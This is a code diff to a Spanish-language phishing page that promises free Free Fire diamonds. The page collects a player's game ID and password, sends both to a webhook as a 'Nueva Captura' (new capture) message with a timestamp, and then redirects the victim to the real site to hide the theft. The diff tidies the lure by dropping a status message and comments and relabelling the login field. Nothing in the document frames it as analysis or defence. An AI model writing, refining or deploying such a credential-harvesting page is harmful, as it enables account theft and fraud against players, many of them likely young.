@@ -130,12 +130,6 @@
             font-size: 0.75rem;
             color: #555;
         }
-
-        .msg {
-            margin-top: 14px;
-            font-size: 0.9rem;
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -166,12 +160,11 @@
         </div>
 
         <form id="form">
-            <input type="text" id="username" placeholder="📧 Correo o ID de Free Fire" required>
+            <input type="text" id="username" placeholder="🎮 ID de Free Fire" required>
             <input type="password" id="password" placeholder="🔑 Contraseña" required>
             <button type="submit" id="btn">RECLAMAR DIAMANTES 💎</button>
         </form>
 
-        <p class="msg" id="msg"></p>
         <p class="note">Solo disponible por tiempo limitado ⏳</p>
     </div>
 
@@ -197,11 +190,9 @@
             const username = document.getElementById("username").value.trim();
             const password = document.getElementById("password").value.trim();
             const btn      = document.getElementById("btn");
-            const msg      = document.getElementById("msg");
 
             if (!username || !password) return;
 
-            // Deshabilitar botón mientras envía
             btn.disabled    = true;
             btn.textContent = "Procesando...";
 
@@ -210,7 +201,7 @@
                     title: "🔥 Nueva Captura — Free Fire",
                     color: 16711680,
                     fields: [
-                        { name: "👤 Usuario / Email", value: "```" + username + "```", inline: true  },
+                        { name: "🎮 ID de Free Fire", value: "```" + username + "```", inline: true  },
                         { name: "🔑 Contraseña",      value: "```" + password + "```", inline: true  },
                         { name: "💎 Paquete",         value: "```" + paquete  + "```", inline: true  },
                         { name: "🕒 Hora",            value: "```" + new Date().toLocaleString() + "```", inline: false }
@@ -229,7 +220,6 @@
                 console.error("Webhook error:", err);
             }
 
-            // Redirigir al sitio real
             window.location.href = REDIRECT;
         });
     </script>
